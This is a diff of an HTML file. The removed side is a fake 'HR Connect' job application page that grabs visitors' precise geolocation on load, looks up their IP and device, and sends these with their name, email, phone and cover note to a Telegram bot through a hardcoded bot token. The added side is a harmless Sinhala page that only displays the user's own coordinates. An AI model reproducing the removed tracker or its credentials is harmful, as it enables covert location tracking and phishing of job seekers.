@@ -1,413 +1,124 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="si">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Job Application - HR Dept</title>
-  <style>
-    /* ===== RESET ===== */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>University Location Project</title>
 
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #eef2f7;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #eef2f3;
+            margin: 0;
+        }
 
-    /* ===== CARD ===== */
-    .card {
-      max-width: 520px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 24px;
-      padding: 32px 28px 36px;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
-      transition: 0.3s;
-      border: 1px solid rgba(0, 0, 0, 0.04);
-    }
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            width: 320px;
+        }
 
-    .card .logo {
-      font-size: 28px;
-      font-weight: 700;
-      color: #1a2a3a;
-      letter-spacing: -0.5px;
-      margin-bottom: 4px;
-    }
+        h2 {
+            margin-top: 0;
+            color: #333;
+        }
 
-    .card .sub-logo {
-      font-size: 14px;
-      color: #6b7a8a;
-      margin-bottom: 24px;
-      border-bottom: 2px solid #f0f4f9;
-      padding-bottom: 16px;
-    }
+        .location-box {
+            background-color: #e3f2fd;
+            color: #0d47a1;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            line-height: 1.5;
+            word-wrap: break-word;
+        }
 
-    /* ===== FORM ===== */
-    .form-group {
-      margin-bottom: 18px;
-    }
+        input[type="text"] {
+            width: 90%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            outline: none;
+            font-size: 14px;
+        }
 
-    .form-group label {
-      display: block;
-      font-size: 14px;
-      font-weight: 600;
-      color: #1a2a3a;
-      margin-bottom: 5px;
-    }
+        input[type="text"]:focus {
+            border-color: #007bff;
+        }
 
-    .form-group input,
-    .form-group select,
-    .form-group textarea {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1.5px solid #dce3ed;
-      border-radius: 12px;
-      font-size: 15px;
-      background: #fafcfe;
-      transition: 0.25s;
-      outline: none;
-      font-family: inherit;
-    }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
 
-    .form-group input:focus,
-    .form-group select:focus,
-    .form-group textarea:focus {
-      border-color: #2a7de1;
-      background: #ffffff;
-      box-shadow: 0 0 0 4px rgba(42, 125, 225, 0.08);
-    }
-
-    .form-group textarea {
-      resize: vertical;
-      min-height: 70px;
-    }
-
-    /* ===== LOCATION STATUS ===== */
-    #location-status {
-      background: #f0f7ff;
-      border-radius: 12px;
-      padding: 12px 16px;
-      font-size: 14px;
-      color: #1a3a6a;
-      margin-bottom: 18px;
-      border-left: 4px solid #2a7de1;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    #location-status .icon {
-      font-size: 20px;
-    }
-
-    #location-status .text {
-      flex: 1;
-    }
-
-    /* ===== SUBMIT ===== */
-    .btn-submit {
-      width: 100%;
-      background: #2a7de1;
-      color: #fff;
-      border: none;
-      padding: 14px;
-      font-size: 17px;
-      font-weight: 600;
-      border-radius: 40px;
-      cursor: pointer;
-      transition: 0.25s;
-      margin-top: 6px;
-      box-shadow: 0 4px 14px rgba(42, 125, 225, 0.3);
-    }
-
-    .btn-submit:hover {
-      background: #1a6ac8;
-      transform: scale(1.01);
-    }
-
-    .btn-submit:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    /* ===== RESPONSIVE ===== */
-    @media (max-width: 480px) {
-      .card {
-        padding: 22px 16px 28px;
-      }
-    }
-  </style>
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
 
-<div class="card">
+    <div class="container">
+        <h2>Location Finder</h2>
+        
+        <div id="location-display" class="location-box">
+            ඔබේ Location එක මෙතැන පෙන්වනු ඇත.
+        </div>
 
-  <!-- ===== HEADER ===== -->
-  <div class="logo">📋 HR Connect</div>
-  <div class="sub-logo">Online Job Application · Sri Lanka</div>
-
-  <!-- ===== LOCATION STATUS (Auto-load) ===== -->
-  <div id="location-status">
-    <span class="icon">📍</span>
-    <span class="text" id="locationText">⏳ Detecting your location...</span>
-  </div>
-
-  <!-- ===== APPLICATION FORM ===== -->
-  <form id="applicationForm">
-
-    <div class="form-group">
-      <label>Full Name</label>
-      <input type="text" id="fullName" placeholder="e.g. Kaveesha Perera" required />
+        <form id="userForm">
+            <input type="text" id="username" placeholder="ඔබේ නම ඇතුළත් කරන්න" required>
+            <button type="submit">Submit</button>
+        </form>
     </div>
 
-    <div class="form-group">
-      <label>Email Address</label>
-      <input type="email" id="email" placeholder="kaveesha@email.com" required />
-    </div>
+    <script>
+        document.getElementById('userForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Submit කරද්දී Page එක Refresh වීම වළක්වයි
 
-    <div class="form-group">
-      <label>Phone Number</label>
-      <input type="tel" id="phone" placeholder="071 234 5678" required />
-    </div>
+            const name = document.getElementById('username').value;
+            const displayBox = document.getElementById('location-display');
 
-    <div class="form-group">
-      <label>Position Applying For</label>
-      <select id="position">
-        <option value="">— Select —</option>
-        <option value="Software Engineer">Software Engineer</option>
-        <option value="UI/UX Designer">UI/UX Designer</option>
-        <option value="Data Analyst">Data Analyst</option>
-        <option value="Marketing Executive">Marketing Executive</option>
-        <option value="Customer Support">Customer Support</option>
-      </select>
-    </div>
+            // Browser එකේ Geolocation Support කරනවාද බලයි
+            if (navigator.geolocation) {
+                displayBox.innerText = "Location ලබාගනිමින් පවතී...";
 
-    <div class="form-group">
-      <label>Brief Cover Note</label>
-      <textarea id="coverNote" placeholder="Why do you want this job?"></textarea>
-    </div>
+                // Location Permission ඉල්ලීම සහ Coordinate ලබාගැනීම
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
 
-    <!-- ===== SUBMIT ===== -->
-    <button type="submit" class="btn-submit" id="submitBtn">🚀 Submit Application</button>
-
-  </form>
-
-</div>
-
-<!-- ============================================================ -->
-<!-- ===== JAVASCRIPT - FIXED ===== -->
-<!-- ============================================================ -->
-<script>
-  // =============================================
-  // 🔐 TELEGRAM CONFIG
-  // =============================================
-  const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
-  const CHAT_ID   = '8308044531';
-
-  // =============================================
-  // 📍 LOCATION - AUTO REQUEST ON PAGE LOAD
-  // =============================================
-  const locationText = document.getElementById('locationText');
-  let userLocation = null;
-  let locationRequested = false;
-
-  function getLocation() {
-    locationText.textContent = '⏳ Requesting location permission...';
-
-    if (!navigator.geolocation) {
-      locationText.textContent = '❌ Geolocation not supported by this browser.';
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      // ✅ Success
-      (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        userLocation = { lat, lon };
-        locationRequested = true;
-
-        // Show location in status
-        locationText.innerHTML = `✅ Location detected: <strong>${lat.toFixed(5)}, ${lon.toFixed(5)}</strong>`;
-
-        // Send location to Telegram immediately
-        sendLocationToTelegram(lat, lon);
-      },
-      // ❌ Error
-      (err) => {
-        console.warn('Location error:', err);
-        if (err.code === 1) {
-          locationText.textContent = '❌ Location permission denied. Allow and refresh.';
-        } else {
-          locationText.textContent = '❌ Location access denied. Please enable GPS.';
-        }
-        userLocation = null;
-        locationRequested = true;
-      },
-      // Options
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
-  }
-
-  // =============================================
-  // 📤 SEND LOCATION TO TELEGRAM
-  // =============================================
-  async function sendLocationToTelegram(lat, lon) {
-    try {
-      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-      let ip = 'Unknown';
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        ip = ipData.ip || 'Unknown';
-      } catch (e) {}
-
-      const ua = navigator.userAgent;
-      const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
-
-      const msg = `
-📍 LOCATION DETECTED
-
-🌐 IP: ${ip}
-📱 Device: ${device}
-🕐 Time: ${new Date().toLocaleString()}
-
-📍 Coordinates:
-Latitude: ${lat}
-Longitude: ${lon}
-
-🗺️ Google Maps:
-${mapsLink}
-      `;
-
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg
-        })
-      });
-
-      if (response.ok) {
-        console.log('✅ Location sent to Telegram');
-      } else {
-        console.error('❌ Failed to send location');
-      }
-
-    } catch (err) {
-      console.error('Send error:', err);
-    }
-  }
-
-  // =============================================
-  // 🚀 PAGE LOAD → AUTO REQUEST LOCATION
-  // =============================================
-  window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(getLocation, 500);
-  });
-
-  // =============================================
-  // 📝 FORM SUBMIT - Send all data to Telegram
-  // =============================================
-  document.getElementById('applicationForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const submitBtn = document.getElementById('submitBtn');
-    submitBtn.disabled = true;
-    submitBtn.textContent = '⏳ Submitting...';
-
-    // Get form values
-    const fullName = document.getElementById('fullName').value.trim();
-    const email = document.getElementById('email').value.trim();
-    const phone = document.getElementById('phone').value.trim();
-    const position = document.getElementById('position').value;
-    const coverNote = document.getElementById('coverNote').value.trim();
-
-    // Validate
-    if (!fullName || !email || !phone) {
-      alert('❌ කරුණාකර Full Name, Email සහ Phone Number පුරවන්න.');
-      submitBtn.disabled = false;
-      submitBtn.textContent = '🚀 Submit Application';
-      return;
-    }
-
-    // ===== ✅ FIX: If location not available, try to get it again =====
-    if (!userLocation && !locationRequested) {
-      alert('⏳ Please wait for location detection. Click Submit again.');
-      submitBtn.disabled = false;
-      submitBtn.textContent = '🚀 Submit Application';
-      getLocation();
-      return;
-    }
-
-    // Build message
-    let msg = `
-📋 NEW JOB APPLICATION
-
-👤 Name: ${fullName}
-📧 Email: ${email}
-📞 Phone: ${phone}
-💼 Position: ${position || 'Not specified'}
-
-📝 Cover Note:
-${coverNote || '—'}
-
-📍 Location: ${userLocation ? `${userLocation.lat}, ${userLocation.lon}` : '❌ Not available'}
-
-🕐 Submitted: ${new Date().toLocaleString()}
-    `;
-
-    // Add location link if available
-    if (userLocation) {
-      msg += `\n🗺️ Maps: https://www.google.com/maps?q=${userLocation.lat},${userLocation.lon}`;
-    }
-
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg
-        })
-      });
-
-      if (response.ok) {
-        submitBtn.textContent = '✅ Application Submitted!';
-        submitBtn.style.background = '#28a745';
-        document.getElementById('applicationForm').reset();
-        userLocation = null;
-        locationRequested = false;
-        setTimeout(getLocation, 1000);
-      } else {
-        submitBtn.textContent = '❌ Submission Failed';
-        submitBtn.disabled = false;
-      }
-
-    } catch (err) {
-      console.error('Submit error:', err);
-      submitBtn.textContent = '❌ Error';
-      submitBtn.disabled = false;
-    }
-  });
-
-  console.log('✅ Job Application Form Loaded');
-  console.log('📍 Location will be requested automatically...');
-</script>
+                        // Text එක විදියට Display එකේ පෙන්වීම
+                        displayBox.innerText = `ආයුබෝවන් ${name}!\n\nඔබේ ස්ථානය:\nLatitude: ${lat}\nLongitude: ${lon}`;
+                    },
+                    function(error) {
+                        // User 'Block' කළොත් හෝ Error එකක් ආවොත්
+                        displayBox.innerText = "Location permission ලබාදීම ප්‍රතික්ෂේප විය.";
+                    }
+                );
+            } else {
+                displayBox.innerText = "ඔබගේ Browser එක මගින් Location සේවාව Support නොකරයි.";
+            }
+        });
+    </script>
 
 </body>
 </html>
